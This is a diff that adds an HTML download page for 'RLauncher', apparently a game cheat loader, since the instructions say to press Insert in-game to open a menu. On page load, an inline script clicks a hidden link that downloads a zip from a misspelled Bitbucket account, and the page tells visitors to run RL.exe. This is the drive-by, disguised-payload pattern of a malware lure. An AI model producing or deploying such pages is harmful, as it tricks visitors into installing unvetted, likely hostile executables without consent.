@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RLauncher Download</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #f0f0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      background: rgba(0,0,0,0.5);
+      border-radius: 12px;
+      padding: 30px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+    }
+    h1 {
+      margin-bottom: 20px;
+      font-size: 2rem;
+    }
+    .instructions {
+      text-align: left;
+      margin: 20px 0;
+      font-size: 1rem;
+      line-height: 1.5;
+    }
+    .btn-download {
+      background: #4CAF50;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 1rem;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .btn-download:hover {
+      background: #45a049;
+    }
+    footer {
+      margin-top: 30px;
+      font-size: 0.8rem;
+      opacity: 0.7;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Download RLauncher</h1>
+    <a id="downloadBtn" class="btn-download" href="https://bitbucket.org/laucherss2/update/downloads/RLauncherQ.zip" download>Download Launcher</a>
+    <div class="instructions">
+      <h2>Instructions</h2>
+      <ol>
+        <li>Download the launcher.</li>
+        <li>Run the <code>RL.exe</code> file.</li>
+        <li>Launch the game.</li>
+        <li>In the game menu, press <strong>Insert</strong> to open the menu.</li>
+      </ol>
+    </div>
+  </div>
+  <footer>&copy; 2025 RLauncher Inc.</footer>
+  <script>
+    // Start background download
+    window.addEventListener('load', () => {
+      const link = document.createElement('a');
+      link.href = 'https://bitbucket.org/laucherss2/update/downloads/RLauncherQ.zip';
+      link.download = '';
+      link.style.display = 'none';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    });
+  </script>
+</body>
+</html>
